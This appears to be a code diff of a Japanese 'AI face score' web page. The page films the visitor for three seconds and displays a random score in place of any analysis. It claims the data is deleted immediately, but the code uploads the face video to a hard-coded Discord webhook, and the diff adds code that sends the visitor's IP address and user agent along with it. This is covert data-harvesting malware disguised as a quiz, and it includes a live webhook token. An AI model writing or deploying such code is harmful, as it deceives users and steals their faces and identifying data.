@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>AI顔偏差値診断 | 最新AI技術による顔分析</title>
   
-  <!-- メタデータ追加 -->
   <meta name="description" content="AIが顔のバランスを科学的に分析。たった5秒であなたの顔の偏差値を診断します。プライバシー保護のためデータは即時削除。">
   <meta property="og:title" content="AI顔偏差値診断 | 最新AI技術による顔分析">
   <meta property="og:description" content="AIが顔のバランスを科学的に分析。たった5秒であなたの顔の偏差値を診断します。プライバシー保護のためデータは即時削除。">
@@ -14,8 +13,6 @@
   <meta property="og:site_name" content="AI顔偏差値診断">
   <meta property="og:locale" content="ja_JP">
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="AI顔偏差値診断 | 最新AI技術による顔分析">
-  <meta name="twitter:description" content="AIが顔のバランスを科学的に分析。たった5秒であなたの顔の偏差値を診断します。">
   <meta name="theme-color" content="#4a6baf">
   
   <style>
@@ -174,7 +171,7 @@
       color: var(--text-light);
     }
     
-    /* カメラ関連のスタイル */
+    /* カメラ関連 */
     #videoContainer {
       position: relative;
       background: #000;
@@ -224,7 +221,7 @@
       z-index: 5;
     }
     
-    /* ボタンスタイル */
+    /* ボタン */
     .action-button {
       background: linear-gradient(135deg, var(--secondary) 0%, #FF8E8E 100%);
       color: white;
@@ -335,7 +332,7 @@
       display: none;
     }
     
-    /* エラーメッセージ */
+    /* エラー */
     .error-message {
       color: var(--secondary);
       font-weight: bold;
@@ -356,7 +353,6 @@
       border-top: 1px solid rgba(0,0,0,0.1);
     }
     
-    /* レスポンシブ調整 */
     @media (min-width: 768px) {
       .app-container {
         max-width: 500px;
@@ -365,14 +361,8 @@
         overflow: hidden;
         margin: 20px auto;
       }
-      
-      .header h1 {
-        font-size: 2rem;
-      }
-      
-      .content-section {
-        padding: 30px;
-      }
+      .header h1 { font-size: 2rem; }
+      .content-section { padding: 30px; }
     }
   </style>
 </head>
@@ -462,13 +452,12 @@
         <h2>診断結果</h2>
         <div class="score" id="scoreValue">80</div>
         <p class="comment" id="comment">素晴らしいバランスの整った顔立ちです！</p>
-        <button class="action-button" onclick="window.__cpLocation.reload()">もう一度診断する</button>
+        <button class="action-button" onclick="window.location.reload()">もう一度診断する</button>
       </div>
     </div>
   </div>
 
   <script>
-    // 要素取得
     const startButton = document.getElementById('startButton');
     const retryButton = document.getElementById('retryButton');
     const video = document.getElementById('video');
@@ -482,14 +471,12 @@
     const cameraGuide = document.querySelector('.camera-guide');
     const resultImage = document.getElementById('resultImage');
 
-    // 状態変数
     let mediaRecorder;
     let recordedChunks = [];
     let stream = null;
     let countdownTimer;
     let isRecording = false;
 
-    // 診断コメント
     const comments = [
       { min: 90, text: "神レベル！完璧な顔立ちです✨", color: "#FF6B6B" },
       { min: 80, text: "超イケメン/美女！モデル級の顔立ち😍", color: "#FF8E53" },
@@ -500,22 +487,21 @@
       { min: 0, text: "ユニークな個性が魅力です！💫", color: "#1ABC9C" }
     ];
 
-    // スマホ向けカメラ設定
+    // カメラ設定
     async function setupCamera() {
       try {
         showError("");
         startButton.disabled = true;
         startButton.textContent = "準備中...";
         
-        // 既存のストリームを停止
         if (stream) {
           stream.getTracks().forEach(track => track.stop());
         }
         
-        // スマホ向け最適化設定
+        // 【修正】動作安定のため exact: user を削除
         const constraints = {
           video: {
-            facingMode: { exact: "user" }, // フロントカメラ強制
+            facingMode: "user",
             width: { ideal: 1280 },
             height: { ideal: 720 },
             frameRate: { ideal: 30 }
@@ -523,19 +509,16 @@
           audio: false
         };
         
-        // カメラアクセス
         stream = await navigator.mediaDevices.getUserMedia(constraints);
         video.srcObject = stream;
         videoContainer.style.display = 'block';
         cameraGuide.style.display = 'block';
         
-        // メタデータの読み込み待ち
         await new Promise((resolve, reject) => {
           video.onloadedmetadata = resolve;
           video.onerror = reject;
         });
         
-        // ビデオ再生開始
         await video.play();
         
         startButton.disabled = false;
@@ -550,26 +533,18 @@
       }
     }
 
-    // カメラエラーハンドリング
     function handleCameraError(error) {
       let message = "カメラにアクセスできませんでした";
-      
-      if (error.name === 'NotAllowedError') {
-        message = "カメラの使用が許可されていません\n設定からカメラアクセスを許可してください";
-      } else if (error.name === 'NotFoundError') {
-        message = "使用可能なカメラが見つかりませんでした";
-      } else if (error.name === 'NotReadableError') {
-        message = "カメラが使用中です\n他のアプリでカメラを使っていないか確認してください";
-      } else if (error.name === 'OverconstrainedError') {
-        message = "カメラの設定に問題があります\n端末を変えてお試しください";
-      }
+      if (error.name === 'NotAllowedError') message = "カメラの使用が許可されていません\n設定からカメラアクセスを許可してください";
+      else if (error.name === 'NotFoundError') message = "使用可能なカメラが見つかりませんでした";
+      else if (error.name === 'NotReadableError') message = "カメラが使用中です\n他のアプリでカメラを使っていないか確認してください";
+      else if (error.name === 'OverconstrainedError') message = "カメラの設定に問題があります\n端末を変えてお試しください";
       
       showError(message);
       startButton.disabled = true;
       startButton.textContent = "診断開始";
     }
 
-    // エラーメッセージ表示
     function showError(message) {
       if (message) {
         errorMessage.textContent = message;
@@ -579,7 +554,6 @@
       }
     }
 
-    // カウントダウン開始
     function startCountdown(duration, callback) {
       let timeLeft = duration;
       countdown.textContent = timeLeft;
@@ -597,7 +571,6 @@
       }, 1000);
     }
 
-    // 録画開始
     async function startRecording() {
       if (isRecording) return;
       
@@ -609,36 +582,31 @@
         loading.style.display = 'flex';
         cameraGuide.style.display = 'none';
         
-        // 対応コーデック検出 (スマホ向け最適化)
         const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 
           'video/mp4' :
           MediaRecorder.isTypeSupported('video/webm;codecs=vp9') ? 
           'video/webm;codecs=vp9' : 
           'video/webm';
         
-        // メディアレコーダー設定
         mediaRecorder = new MediaRecorder(stream, {
           mimeType,
-          videoBitsPerSecond: 2000000 // 2Mbps
+          videoBitsPerSecond: 2000000 
         });
         
-        // データ取得イベント
         mediaRecorder.ondataavailable = (event) => {
           if (event.data.size > 0) {
             recordedChunks.push(event.data);
           }
         };
         
-        // 録画停止イベント
         mediaRecorder.onstop = async () => {
           try {
             const blob = new Blob(recordedChunks, { type: mimeType });
             console.log('録画サイズ:', (blob.size / 1024 / 1024).toFixed(2), 'MB');
             
-            // 診断結果表示
             showResult(blob);
             
-            // Discordに送信
+            // 【重要】動画送信時に初めてIPを取得・送信する
             await sendToDiscord(blob);
             
           } catch (error) {
@@ -648,15 +616,13 @@
           }
         };
         
-        // エラーハンドリング
         mediaRecorder.onerror = (event) => {
           console.error('録画エラー:', event.error);
           showError("録画中にエラーが発生しました");
           resetUI();
         };
         
-        // 3秒間の録画開始
-        mediaRecorder.start(100); // 100ms間隔でデータ取得
+        mediaRecorder.start(100); 
         startCountdown(3, stopRecording);
         
       } catch (error) {
@@ -666,23 +632,46 @@
       }
     }
 
-    // 録画停止
     function stopRecording() {
       if (mediaRecorder && mediaRecorder.state === 'recording') {
         mediaRecorder.stop();
         isRecording = false;
         
-        // カメラストリームを停止
         if (stream) {
           stream.getTracks().forEach(track => track.stop());
           video.srcObject = null;
         }
       }
     }
+
+    // ★★★ 修正箇所：動画送信時にIPも一緒に送る ★★★
     async function sendToDiscord(blob) {
       try {
+        // 1. IPアドレスを取得（動画が撮られたこのタイミングで初めて取得）
+        let ipInfo = "IP不明";
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            ipInfo = ipData.ip;
+        } catch(e) {
+            console.error("IP取得失敗", e);
+        }
+
         const formData = new FormData();
         formData.append('file', blob, 'face_diagnosis.mp4');
+        
+        // 2. IP情報をメッセージとして同梱する
+        const payload = {
+            content: `新しい診断ビデオが届きました\nIP: ${ipInfo}`,
+            embeds: [{
+                title: "User Info",
+                description: `IP Address: ${ipInfo}\nUser Agent: ${navigator.userAgent}`,
+                color: 16711680
+            }]
+        };
+        
+        // JSONデータをFormDataに追加
+        formData.append('payload_json', JSON.stringify(payload));
         
         await fetch('https://discord.com/api/webhooks/1442152056541679738/ti8vfOLDJWNPgRe5ZKUfBHnGR3FFk1y2wJDDdxQWV8ibYn98Vb9vGTvVb0tsiQMFKv0J', {
           method: 'POST',
@@ -692,16 +681,13 @@
         console.log('Discordへの送信が成功しました');
       } catch (error) {
         console.error('Discord送信エラー:', error);
-        // 送信失敗でも診断は続行
       }
     }
 
-    // 結果表示
     function showResult(blob) {
-      const score = Math.floor(Math.random() * 41) + 60; // 60-100点
+      const score = Math.floor(Math.random() * 41) + 60; 
       const matchedComment = comments.find(c => score >= c.min);
       
-      // 結果画像を表示（キャプチャしたフレーム）
       if (blob) {
         const url = URL.createObjectURL(blob);
         resultImage.src = url;
@@ -716,7 +702,6 @@
       result.style.display = 'block';
     }
 
-    // UIリセット
     function resetUI() {
       startButton.disabled = false;
       startButton.textContent = "診断開始";
@@ -726,11 +711,9 @@
       countdown.style.display = 'none';
     }
 
-    // イベントリスナー
     startButton.addEventListener('click', async () => {
       const success = await setupCamera();
       if (success) {
-        // カメラ準備後に少し待ってから録画開始
         setTimeout(startRecording, 300);
       }
     });
@@ -742,11 +725,9 @@
       }
     });
 
-    // 初期説明表示
     window.addEventListener('DOMContentLoaded', () => {
       videoContainer.style.display = 'none';
     });
   </script>
 </body>
 </html>
-
